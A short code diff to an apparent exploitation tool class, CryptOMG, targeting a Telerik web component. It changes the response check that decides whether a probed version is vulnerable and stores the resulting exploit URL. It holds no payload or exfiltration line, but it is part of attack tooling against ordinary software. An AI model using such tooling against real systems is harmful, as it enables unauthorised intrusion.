@@ -154,7 +154,7 @@ class CryptOMG:
             full_url = f"{self.url}{telerik_params}&dp={ciphertextB64}"
 
             r = self.versionProbe(full_url, version)
-            if r.status_code == 200 and b"Error" not in r.content:
+            if r.status_code == 200 and b"Document Manager" in r.content:
                 self.msgPrint(f"Vulnerable component confirmed! Version is: {[version][0]}", style="success")
                 self.exploit_url = full_url
                 self.terminal.exploit_url_draw()
